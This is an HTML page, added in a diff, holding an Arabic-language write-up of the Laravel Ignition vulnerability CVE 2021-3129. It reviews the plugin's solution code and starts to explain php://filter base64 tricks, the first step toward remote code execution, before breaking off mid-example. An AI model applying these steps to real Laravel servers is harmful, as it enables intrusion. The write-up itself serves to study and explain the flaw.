@@ -1,0 +1,729 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>CVE 2021-3129</title><style>
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, YuMincho, "Yu Mincho", "Hiragino Mincho ProN", "Hiragino Mincho Pro", "Songti TC", "Songti SC", "SimSun", "Nanum Myeongjo", NanumMyeongjo, Batang, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, YuMincho, "Yu Mincho", "Hiragino Mincho ProN", "Hiragino Mincho Pro", "Songti TC", "Songti SC", "SimSun", "Nanum Myeongjo", NanumMyeongjo, Batang, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.highlight-default {
+}
+.highlight-gray {
+	color: rgb(155,154,151);
+}
+.highlight-brown {
+	color: rgb(100,71,58);
+}
+.highlight-orange {
+	color: rgb(217,115,13);
+}
+.highlight-yellow {
+	color: rgb(223,171,1);
+}
+.highlight-teal {
+	color: rgb(15,123,108);
+}
+.highlight-blue {
+	color: rgb(11,110,153);
+}
+.highlight-purple {
+	color: rgb(105,64,165);
+}
+.highlight-pink {
+	color: rgb(173,26,114);
+}
+.highlight-red {
+	color: rgb(224,62,62);
+}
+.highlight-gray_background {
+	background: rgb(235,236,237);
+}
+.highlight-brown_background {
+	background: rgb(233,229,227);
+}
+.highlight-orange_background {
+	background: rgb(250,235,221);
+}
+.highlight-yellow_background {
+	background: rgb(251,243,219);
+}
+.highlight-teal_background {
+	background: rgb(221,237,234);
+}
+.highlight-blue_background {
+	background: rgb(221,235,241);
+}
+.highlight-purple_background {
+	background: rgb(234,228,242);
+}
+.highlight-pink_background {
+	background: rgb(244,223,235);
+}
+.highlight-red_background {
+	background: rgb(251,228,228);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(55, 53, 47, 0.6);
+	fill: rgba(55, 53, 47, 0.6);
+}
+.block-color-brown {
+	color: rgb(100,71,58);
+	fill: rgb(100,71,58);
+}
+.block-color-orange {
+	color: rgb(217,115,13);
+	fill: rgb(217,115,13);
+}
+.block-color-yellow {
+	color: rgb(223,171,1);
+	fill: rgb(223,171,1);
+}
+.block-color-teal {
+	color: rgb(15,123,108);
+	fill: rgb(15,123,108);
+}
+.block-color-blue {
+	color: rgb(11,110,153);
+	fill: rgb(11,110,153);
+}
+.block-color-purple {
+	color: rgb(105,64,165);
+	fill: rgb(105,64,165);
+}
+.block-color-pink {
+	color: rgb(173,26,114);
+	fill: rgb(173,26,114);
+}
+.block-color-red {
+	color: rgb(224,62,62);
+	fill: rgb(224,62,62);
+}
+.block-color-gray_background {
+	background: rgb(235,236,237);
+}
+.block-color-brown_background {
+	background: rgb(233,229,227);
+}
+.block-color-orange_background {
+	background: rgb(250,235,221);
+}
+.block-color-yellow_background {
+	background: rgb(251,243,219);
+}
+.block-color-teal_background {
+	background: rgb(221,237,234);
+}
+.block-color-blue_background {
+	background: rgb(221,235,241);
+}
+.block-color-purple_background {
+	background: rgb(234,228,242);
+}
+.block-color-pink_background {
+	background: rgb(244,223,235);
+}
+.block-color-red_background {
+	background: rgb(251,228,228);
+}
+.select-value-color-default { background-color: rgba(206,205,202,0.5); }
+.select-value-color-gray { background-color: rgba(155,154,151, 0.4); }
+.select-value-color-brown { background-color: rgba(140,46,0,0.2); }
+.select-value-color-orange { background-color: rgba(245,93,0,0.2); }
+.select-value-color-yellow { background-color: rgba(233,168,0,0.2); }
+.select-value-color-green { background-color: rgba(0,135,107,0.2); }
+.select-value-color-blue { background-color: rgba(0,120,223,0.2); }
+.select-value-color-purple { background-color: rgba(103,36,222,0.2); }
+.select-value-color-pink { background-color: rgba(221,0,129,0.2); }
+.select-value-color-red { background-color: rgba(255,0,26,0.2); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="51476d6b-0adb-4e64-808e-1af5aa625477" class="page sans"><header><h1 class="page-title">CVE 2021-3129</h1></header><div class="page-body"><h1 id="bb551265-6381-40f1-8ac1-ec5fc026f959" class=""><mark class="highlight-teal">Laravel</mark></h1><h2 id="25038014-56c4-4802-9809-4326e798d37b" class=""><mark class="highlight-red">Introduction:</mark></h2><p id="31af3241-38e5-4e50-9527-804880f27a61" class="">تم إكتشاف هذه الثغرة في عملية فحص لأحد الشركة من قبل باحثين في الأمن السبراني بعد أنا واجهوا وب أبليكشن</p><p id="d4fd69d0-d200-465e-96e6-c47c3d45a366" class="">يعمل ب laravel.</p><p id="da4f93a8-fb00-4013-b057-f754bab95dd0" class="">ملاحظة: أنا قرأت التقرير الأساسي وبعد ما فهمته وفصلت النقاط التي لم تكن واضحة لي وقمت بتحليل الإستغلال فكرت أترجمه نظراً لعظمة الأفكار لي بداخله من كيفية إكتشاف الثغرة حتى إستغلالها.</p><p id="3123b9d7-ed8b-4d16-8aab-1fffca5055f0" class="">
+</p><p id="08934545-3f07-480d-9a8a-08f402d02976" class="">أول شيء بدأ الباحث بتفحص الموقع، تبن له بعد تفتيش</p><p id="ef8ec6c2-3624-4264-a01f-ec85a1032503" class="">ظهور خطأ بطريقة واضحة جداً مع stack trace.</p><p id="30a46718-fece-4773-aca3-d094d0e44982" class="">الخطأ كان لما مثلاً تحاول تصفح مسار في الموقع غير</p><p id="e69e9e57-fd9d-4976-8d30-030f9bf06015" class="">موجود، وكان خطأ المبرمج متعلق بترك boolean variable، تابع لأضافة على الموقع هذه الأضافة تساعد في عملية ال debugging، من هنا الباحث عرف أسمها وهي كانت مشروع متاح للجميع على github.</p><p id="a763987d-9d76-4f60-bb19-558462a9c9ae" class="">٢-الأضافة ignition:</p><p id="32d7c415-463a-4945-bd8e-044b4bea26b7" class="">هي أضافة تحسن مظهر ال </p><p id="b5128884-badc-400f-b6af-4b3eed3b777e" class="">error page.</p><figure id="ffa84a47-73a8-4eb7-b285-137e7a1b2175" class="image"><a href="CVE%202021-3129%20ffa84a4773a84eb7b285137e7a1b2175/1.png"><img style="width:1474px" src="CVE%202021-3129%20ffa84a4773a84eb7b285137e7a1b2175/1.png"/></a></figure><p id="626d0d13-976b-42d0-93ac-83cccee89f48" class="">بطريقة لتسهيل العمل على المبرمج في حال حصول error وليس هذا فقط تساعد هذه الأضافة على إقتراح حلول للمشكلة و هذا ما يظهر في الصورة باللون الأخضر بإمكانك الضغط على الزر لإصلاح الخطأ أوتوماتيكياً. وبهذا تكون قد ساعدتك في حل المشكلة.</p><p id="ac5b5a6c-ef3b-4108-8df3-d3c5ae213334" class="">كما واضح في الصورة الخبير الأمني، عمل نسخة مشابهة لهدفه حتى يتفحص ويتعمق في الموضوع، عندما قام بتعريف </p><p id="38fa29bf-46ef-4de8-9bec-ff23413e74af" class="">variable</p><p id="6566fc1a-e5c5-4b29-9ad1-13d5946b2f89" class="">{{ $username }}</p><p id="1ee086be-c64a-49b1-95d0-06b9cde5f33d" class="">الي هو unknown variable، يعني مجهول القيمة.</p><p id="565b3d4d-3b59-42c7-b78b-d9a026aae4ac" class="">فحصل الخطأ و أعطانا إقتراح لتغير التعريف من:</p><p id="965ba78f-1b80-44d2-beb9-8c8a12e8b8c0" class="">{{ $username }}</p><p id="f40ec8c7-c0a5-41a9-ad6b-171321a7b0cb" class="">إلى</p><p id="71afc337-db9c-4125-a2a8-42f0ccf19626" class="">{{ $username ?? &#x27; &#x27;}}</p><figure id="8d8d5204-6816-4455-b6af-78f17d530b1b" class="image"><a href="CVE%202021-3129%20ffa84a4773a84eb7b285137e7a1b2175/2.png"><img style="width:1470px" src="CVE%202021-3129%20ffa84a4773a84eb7b285137e7a1b2175/2.png"/></a></figure><p id="991da7c4-824d-4948-a201-6839c56ad379" class="">لا تهتم للشكل هذه الطريقة مستخدمة في laravel php framework.</p><p id="2c7acf62-cc79-455d-ab1f-b226fc6e0976" class="">المهم هو بعد ما تعمل intercept لل request:</p><p id="bd772a19-35ee-4d55-8450-720540fe0cec" class="">:تظهر الصورة هذه</p><figure id="5463968d-abe0-4870-a9b5-6dee58ce4748" class="image"><a href="CVE%202021-3129%20ffa84a4773a84eb7b285137e7a1b2175/3_(1).png"><img style="width:1020px" src="CVE%202021-3129%20ffa84a4773a84eb7b285137e7a1b2175/3_(1).png"/></a></figure><p id="f9926bd8-2f8b-4b2d-8c80-85bcd4610685" class="">من هذه الصورة أستنتج الباحث:</p><p id="211d1495-bb53-4ecf-8f3b-9871df2b49af" class="">1- end point</p><p id="9545bb2e-977a-48b9-9eee-a284e9d0b872" class="">2-paramters:</p><p id="8ad15f48-0949-4ef9-b6a0-85c48e2c880e" class="">a- variableName</p><p id="217a7c03-c03e-4a30-aa8a-9e6c6a1c0ffe" class="">b- viewFile</p><p id="b41a6896-36e9-4a16-ac38-0479004980e9" class="">3- solution classname</p><p id="7b48bc77-23b0-4b10-b50b-0d55c7413a06" class="">variableName:</p><p id="1e9e2d42-96a6-435d-87f5-b059571eb2d2" class="">هو المتغير الذي نريد التعديل عليه نظراً لحدوث خطأ فيه، في حالتنا:</p><p id="1ef12048-73c7-4163-b089-a8245593d400" class="">username</p><p id="74c4fe32-187c-4507-9897-feb753740fb6" class="">viewFile:</p><p id="06d8d337-e1e9-46a2-a385-1dddcc2f0820" class="">الملف الذي يحوي الكود.</p><p id="c93faf93-cc43-4420-a357-6f0188db54eb" class="">Solution classname:</p><p id="5857d612-7475-4d9f-8fc8-62a6c6b6b1ce" class="">هي عبارة عن أكواد برمجية سنتحدث عنها لاحقاً، هدفها إقتراح الحل و تصحيح الخطأ</p><p id="e5adf8c0-a16f-44b0-8620-0d7d2db2341d" class="">:قام الباحث بقرأة كود ال</p><p id="77c5d518-eb97-4d02-ba12-d70b01dea2aa" class="">class </p><p id="9b3affc0-e388-43a7-96e0-ea405336ec65" class="">:التي في صورة أدناه</p><figure id="3c91d292-f33b-4200-96d7-5bd3feecf091" class="image"><a href="CVE%202021-3129%20ffa84a4773a84eb7b285137e7a1b2175/Untitled.png"><img style="width:827px" src="CVE%202021-3129%20ffa84a4773a84eb7b285137e7a1b2175/Untitled.png"/></a></figure><figure id="4b8ec5e8-001f-4a9e-9e54-50ea1c18e735" class="image"><a href="CVE%202021-3129%20ffa84a4773a84eb7b285137e7a1b2175/Untitled%201.png"><img style="width:618px" src="CVE%202021-3129%20ffa84a4773a84eb7b285137e7a1b2175/Untitled%201.png"/></a></figure><pre id="258b4729-4eaa-461e-a043-7acf36e710c2" class="code"><code>public function getSolutionForClass(string $solutionClass): ?Solution
+    {
+        if (! class_exists($solutionClass)) { // [1]
+            return null;
+        }
+
+        if (! in_array(Solution::class, class_implements($solutionClass))) {
+            return null;
+        }
+
+        return app($solutionClass);
+    }</code></pre><p id="4568cd73-ca88-4828-ba7b-de5e863224a7" class="">بعد تفحصها يظهر واضح أن getSolutionForClass</p><p id="421818c8-cb8e-4375-8483-a77f7aef8bcb" class="">تستخدم function class_exists</p><p id="fe960b8c-2037-4fef-bb91-3301cb431ca3" class="">:هذا شرح لها</p><p id="92cfd3f2-9784-4d36-a591-70bc5b9012e0" class=""><a href="https://www.php.net/manual/en/function.class-exists.php">https://www.php.net/manual/en/function.class-exists.php</a></p><p id="51deae82-15e9-43f3-8b1e-8bd1bd4cc0fb" class="">في هذه الحالة الكود يتأكد من وجود ال</p><p id="5454dcc4-d4ea-41f6-8ce2-3413266cde2b" class="">class</p><p id="9f111353-5eef-4281-bed5-ec5e42a46129" class="">(1) في حال عدم وجودها نخرج من الكود</p><p id="586742c9-64e5-481f-967b-035061b9f183" class="">طيب نذهب الأن إلى الكود المسؤل عن التصحيح</p><p id="9ff5e979-89ef-4e3f-a943-d97f5f3e72ac" class="">/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php</p><p id="9fdbff80-0024-48ef-ae61-68be4cf903a7" class="">:هذا الكود الخاص بها</p><p id="0da6889c-02a6-4d11-84d4-ea237e14c730" class="">:هنا تبدأ مرحلة الكود ريفيو</p><p id="0bdf3f97-3bd2-48db-975a-15d4df3881c9" class="">ال function makeOptional إرجع للخطأ في البداية لتعرف لماذا إختار الباحث هذه ال</p><p id="68276768-342a-4a40-b868-35451580f3e9" class="">function</p><pre id="5406673b-f668-437e-a3a3-497b88b67fcf" class="code"><code>class MakeViewVariableOptionalSolution implements RunnableSolution
+{
+    ...
+
+    public function run(array $parameters = [])
+    {
+        $output = $this-&gt;makeOptional($parameters);
+        if ($output !== false) {
+            file_put_contents($parameters[&#x27;viewFile&#x27;], $output);
+        }
+    }
+
+    public function makeOptional(array $parameters = [])
+    {
+        $originalContents = file_get_contents($parameters[&#x27;viewFile&#x27;]); // [1]
+        $newContents = str_replace(&#x27;$&#x27;.$parameters[&#x27;variableName&#x27;], &#x27;$&#x27;.$parameters[&#x27;variableName&#x27;].&quot; ?? &#x27;&#x27;&quot;, $originalContents);
+
+        $originalTokens = token_get_all(Blade::compileString($originalContents)); // [2]
+        $newTokens = token_get_all(Blade::compileString($newContents));
+
+        $expectedTokens = $this-&gt;generateExpectedTokens($originalTokens, $parameters[&#x27;variableName&#x27;]);
+
+        if ($expectedTokens !== $newTokens) { // [3]
+            return false;
+        }
+
+        return $newContents;
+    }
+
+    protected function generateExpectedTokens(array $originalTokens, string $variableName): array
+    {
+        $expectedTokens = [];
+        foreach ($originalTokens as $token) {
+            $expectedTokens[] = $token;
+            if ($token[0] === T_VARIABLE &amp;&amp; $token[1] === &#x27;$&#x27;.$variableName) {
+                $expectedTokens[] = [T_WHITESPACE, &#x27; &#x27;, $token[2]];
+                $expectedTokens[] = [T_COALESCE, &#x27;??&#x27;, $token[2]];
+                $expectedTokens[] = [T_WHITESPACE, &#x27; &#x27;, $token[2]];
+                $expectedTokens[] = [T_CONSTANT_ENCAPSED_STRING, &quot;&#x27;&#x27;&quot;, $token[2]];
+            }
+        }
+
+        return $expectedTokens;
+    }
+
+    ...
+}</code></pre><p id="0885116f-10a8-43d2-8494-d0d8604d71f7" class="">١- عند الرقم واحد في الكود، نستنتج عملية قرأة لملف</p><pre id="53dc8967-c391-473a-98e7-ba3f33287143" class="code"><code>$originalContents = file_get_contents($parameters[&#x27;viewFile&#x27;]);</code></pre><p id="fa3401d5-c24a-42da-ba4d-fd345827bc57" class="">٢-من بعدها عملية الإستبدا التي ستحصل على ال </p><p id="49d9a240-e67c-4a70-8024-3c63b22da9c4" class="">variable username.</p><pre id="55f427c2-7314-4009-b78d-ebfbe4e9ee3c" class="code"><code>$newContents = str_replace(&#x27;$&#x27;.$parameters[&#x27;variableName&#x27;], &#x27;$&#x27;.$parameters[&#x27;variableName&#x27;].&quot; ?? &#x27;&#x27;&quot;, $originalContents);</code></pre><p id="7e4e53c0-9883-4126-8ab9-bd505bed12cd" class="">٣- من بعدها عند الرقم ٢ في الكود: نلاحظ عملية تأكد من خلال </p><p id="da5082b6-ea12-408c-b05e-16bb43dd3056" class="">token</p><p id="1d5598c9-9549-4b1b-95dc-74027ee6bb19" class="">متوقع و</p><p id="a3e5835c-250d-46dc-9f91-73397225d82d" class="">token </p><p id="ac198107-1542-470a-bd91-85bb1eea8c3d" class="">بعد التعديل ، ومن ثم مقارنة بين الأثنين في حال كان</p><p id="91a87cae-c6da-4718-8bec-dad741f2fbad" class=""> ال</p><p id="8effd5f1-e7a2-4030-8083-0bb77ee5ffc7" class="">token </p><p id="3090a713-ace8-4c02-9da7-e2b60805e1b7" class="">الجديد غير المتوقع، نخرج من ال</p><p id="91938a60-8125-47ee-9a15-7cac3b6eca07" class=""> function </p><p id="5af7cb23-1fb7-47ae-9327-a84f563f20da" class="">كما موضح في الرقم ٣ داخل الكود</p><p id="a527878c-1bd7-4ccb-a4ec-725ff1aa6f76" class="">من هنا يتبين أن التغير الذي سيحصل على ال </p><p id="e90a6777-8da3-411a-9049-9c2750054f60" class="">entry point variableName </p><p id="99c0939c-cb9d-4741-8534-8719f6362c38" class="">ما رح يساعد في هذه الحالة نظراً لعملية التحقق</p><p id="ef4ee7ee-71a7-44bb-9b6c-a58fbff9d27c" class="">إذا نحن أمام مدخل واحد وهو </p><p id="95437d80-a4b6-4e31-9901-19e2854dafde" class="">viewFile:</p><p id="60f77320-8466-4468-90df-5a4a391cd926" class="">قام الباحث بعمل تصور للموضوع وكانت هذه النتيجة:</p><pre id="9580513f-0412-41f9-a679-8184ef3bdad9" class="code"><code>$contents = file_get_contents($parameters[&#x27;viewFile&#x27;]);
+file_put_contents($parameters[&#x27;viewFile&#x27;], $contents);</code></pre><p id="3d8fcf63-55c2-4a53-99f9-da65edb7afe2" class="">توضيحي للموضوع: يتم قرأت الملف من ثم إعادت كتابة قيمته على نفسه. وبذلك في هذا الكود لا نقوم بعمل شيء سوا إعادة كتابة نفس المحتوى</p><h2 id="5d5dcbf4-9c11-4b29-92e0-e7f7fca6da5c" class=""><mark class="highlight-red">Log file to PHAR</mark></h2><p id="1a6c5198-39a0-4881-894f-741fe05284e3" class="">phar: php archive</p><p id="17d611f2-bad8-4851-8d15-fd5587a06638" class="">:في شرح بسيط عنها في الأسفل</p><p id="44ddb36a-a06f-421d-998a-25ee28cd4da0" class="">php wappers: changing file</p><p id="bb8a9d8f-68a0-4b7f-a4ea-bbbdbc94ce5c" class=""><a href="https://www.php.net/manual/en/wrappers.php.php">https://www.php.net/manual/en/wrappers.php.php</a></p><p id="74ae3fcb-1f7a-4f28-a114-b976b8a7341d" class="">
+</p><p id="8dc1a5d6-fa31-4d75-b901-c665c5d94ae3" class="">كان الباحث على إطلاع على طريقة للتعديل على الملفات من خلال </p><p id="7b79ad5a-c972-446a-8fbe-5a041c95f554" class="">php wappers.</p><p id="473782f9-44f1-4026-bb4f-9ae0a2e42a07" class="">بشكل بسيط في المثال التالي شرح كيف تستخدم هذه ال </p><p id="e270526a-aa60-4cae-94f8-909019484b79" class="">php wappers</p><pre id="1ce29ccf-901e-4199-b660-b58e10d0787c" class="code"><code>$ echo test | base64 | base64 &gt; /path/to/file.txt
+$ cat /path/to/file.txt
+ZEdWemRBbz0K</code></pre><pre id="6fcc7991-ccdf-4b0b-b43c-8a8e0b0e6109" class="code"><code>$f = &#x27;php://filter/convert.base64-decode/resource=/path/to/file.txt&#x27;;
+# Reads /path/to/file.txt, base64-decodes it, returns the result
+$contents = file_get_contents($f); 
+# Base64-decodes $contents, then writes the result to /path/to/file.txt
+file_put_contents($f, $contents);</code></pre><pre id="559399b0-e371-4327-92c9-24218d7f2c57" class="code"><code>$ cat /path/to/file.txt
+test</code></pre><p id="aa072602-bd27-4659-bcf6-877e6d371a48" class="">كما لاحظنا أن </p><p id="8e3e8bfc-3505-47b5-9fb5-246790c9e499" class="">content </p><p id="ec2f8c3a-26d5-44d9-8df0-c4c0adb23af6" class="">الملف تغير</p><p id="a4b5d33c-9b95-4519-b053-e695a82ef9e1" class="">بس نحن عملنا </p><p id="ac6f6ec1-c8ee-4021-a338-373f04ecf8b1" class="">encode </p><p id="e6e05720-6496-4872-b75a-dbeb0684e03c" class="">مرتين </p><p id="feb905c6-7b5f-4f4a-b167-680eaa345fcc" class="">base64 </p><p id="79534c9a-8e0a-4f91-97fd-4c17c6faf78c" class="">.والكود قدر يفك الأثنين ليس كما كنا متوقعين</p><p id="ac1753c7-4774-4ccd-9237-baef28e36d1c" class="">
+</p><p id="7278b251-8010-4fbb-90a7-e627bb2b50d4" class="">الباحث بعد التعمق في ال </p><p id="38fb0f54-cc98-45f6-b35c-d20813242a17" class="">documentation </p><p id="25ef3160-d8ff-417e-a8b3-6d3da57322f3" class="">قدر أنه يلاقي طريقة لعمل ال </p><p id="500a24da-3a0c-47d7-ae38-eb92061e2fd6" class="">decode </p><p id="c70ef733-0a06-440f-be05-fe6811198aa0" class="">مرة واحدة كما موضح في الكود أدناه</p><pre id="b067d39e-e26c-44d9-894e-a75d5e9d156e" class="code"><code># To base64-decode once, use:
+$f = &#x27;php://filter/read=convert.base64-decode/resource=/path/to/file.txt&#x27;;
+# OR
